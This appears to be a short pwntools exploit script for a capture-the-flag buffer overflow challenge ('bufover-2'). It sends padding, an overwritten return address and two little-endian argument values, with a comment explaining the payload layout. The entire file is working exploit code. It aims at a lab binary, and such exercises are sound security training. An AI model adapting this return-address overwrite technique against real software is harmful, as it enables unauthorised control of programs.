from pwn import *

p = process("./bufover-2")
p.recv()
bufSend = chr(int("a9", 16)) * 28 
bufSend += chr(int("c2", 16)) + chr(int("91", 16)) + chr(int("04", 16)) + chr(int("08", 16)) 
bufSend += chr(int("a9", 16)) * 4 
bufSend += chr(int("55", 16)) + chr(int("DA", 16)) + chr(int("B4", 16)) + chr(int("14", 16)) 
bufSend += chr(int("00", 16)) * 4 
bufSend += chr(int("BE", 16)) + chr(int("B4", 16)) + chr(int("0D", 16)) + chr(int("F0", 16))
# the entire message is just a lot of padding then the desired address and then f00db4be and 15b4da55 in little order.
p.sendline(bufSend)
print(p.recv())
p.close()